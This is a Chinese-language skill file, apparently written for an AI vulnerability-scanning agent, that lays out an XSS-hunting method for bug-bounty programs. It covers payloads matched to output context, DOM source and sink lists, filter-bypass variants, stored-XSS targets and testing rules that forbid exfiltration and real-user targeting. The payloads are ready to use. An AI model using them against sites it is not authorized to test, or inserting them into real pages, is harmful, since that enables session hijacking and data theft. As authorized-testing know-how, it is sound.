---
name: hunt-xss
description: XSS 挖掘：按输出上下文逃逸矩阵定位 payload、DOM sink/source 清单、编码层绕过、无回显场景的证明法与 SRC 判定纪律
whenToUse: 找到输入会回显的页面（搜索/昵称/评论/URL 参数进 JS）时；配合 SPA 的 DOM XSS 审计
role: vuln-scan
enabled: true
---

# XSS 挖掘：上下文决定 payload

## 第一步：判输出上下文（先看回显位置再选 payload）

| 回显位置 | 逃逸关键 | 首选 payload |
|---|---|---|
| HTML body | 断标签 | `<svg onload=alert(1)>`、`<img src=x onerror=alert(1)>` |
| HTML 属性内（`value="..."`） | 断引号 | `" onfocus=alert(1) autofocus "`、`" onmouseover=alert(1) "` |
| 属性内且引号被转 | 靠事件分割 | `` `onfocus=alert(1) ``、`' onfocus=alert(1) ' ` |
| `<script>` 内 JS 字符串（`var x="..."`） | 断字符串闭合 | `";alert(1);//`、`</script><svg onload=alert(1)>` |
| JS 模板字符串（`` var x=`...` ``） | 断反引号 | `` ${alert(1)} `` |
| URL/href（`href="..."`） | javascript 协议 | `javascript:alert(1)`（配 `data:` 需浏览器支持） |
| CSS 内 | expression（仅老 IE） | 基本不可判，跳过 |
| 源码注释内 | 无逃逸路径，放弃 | — |

## 判定阶梯（从试探到确认）

1. **标记回显**：`abc'"<>()` 看哪些字符被编码（`&lt;`=实体编码；`\u003c`=JSON 层；无变化=原样输出）。
2. **试探闭合**：按上下文表选 payload，先 `alert(1)` 级别（无网络行为）。
3. **确认执行**：浏览器渲染后弹窗即定性；**截图存证**（含 URL + payload）。
4. **证明影响**（SRC 需要危害说明）：演示可窃取同源数据即可——payload 换 `alert(document.cookie)` 或 `alert(localStorage.getItem('token'))` 截图，**不外带、不打真实用户**。

## DOM XSS：sink/source 清单

**source**：`location.hash`、`location.search`、`document.referrer`、`postMessage`、`window.name`、`localStorage`（可被同站 XSS 污染）。

**高危 sink**：

| sink | 危害形式 |
|---|---|
| `innerHTML` / `outerHTML` / `insertAdjacentHTML` | 直接执行 |
| `document.write` / `writeln` | 直接执行 |
| `eval` / `setTimeout(str)` / `setInterval(str)` / `Function(str)` | 字符串执行 |
| `jQuery $(str)` / `.html(str)` | jQuery XSS（`$('url')` 还带 CORS 绕过面） |
| `location = userInput` / `location.href=` | javascript: URL |
| `jQuery.globalEval` / `$.getScript` | 远程脚本加载 |

**审计法**（SPA 有 sourcemap 时最顺）：
```bash
# 解包后的 app.js 里定位 source→sink 数据流
grep -nE "innerHTML|document\.write|eval\(|\.html\(|setTimeout\(['\"]" dist/assets/*.js | head -50
# 找 source 入口后浏览器验证：#<payload> 直接挂 hash
```

## 编码层绕过（按过滤特征选）

| 过滤特征 | 变体 |
|---|---|
| 拦 `<script` | `<svg onload=>`、`<img src=x onerror=>`、`<details open ontoggle=>`、`<body onload=>` |
| 拦 `alert` | `prompt(1)`、`confirm(1)`、`top[/al/.source+/ert](1)`、`alert\u28\u31\u29` |
| 大小写过滤 | `<ScRiPt>`、`<sVg OnLoAd=>` |
| 转义 `<` `>` 但在属性内 | 先断属性再触发事件（不需要新标签） |
| 实体编码一次 | 双重编码 `%253C`（少见于现代栈，后端二次解码才有效） |
| 拦分号 | 换行分隔多条语句、`}` 闭合函数体 |

## 存储 XSS 高价值面

- 富文本编辑器保存（看服务端白名单：`<svg>` `<math>` `<form>` 常漏）；
- 昵称/签名/地址 → 后台管理端触发（管理员视角，危害升级）；
- 文件名渲染（`<img src=x onerror=...>.png` 的名字回显在列表页）；
- Markdown 渲染（`[x](javascript:alert(1))`）；
- 导出功能回显（CSV/HTML 导出时未编码 → 管理端 XSS）。

## 纪律

- 只在**自建测试账号**的数据里放存储 payload；确认后立即删除注入数据。
- 不对真实用户投递 payload、不外带 cookie/token（截图 `alert()` 即可证明）。
- `alert(document.cookie)` 仅截图含同源非敏感 token 的话脱敏展示。

## 产出约定

- 回填：category=other（或按业务归 info-leak），tags 带 xss/上下文类型，content 记录「上下文→逃逸路径→证明截图路径」。

<!-- 改编自: 纯原创方法论汇总（OWASP/PortSwigger 公开知识体系整理，无单一上游）, 2026-10-31 -->

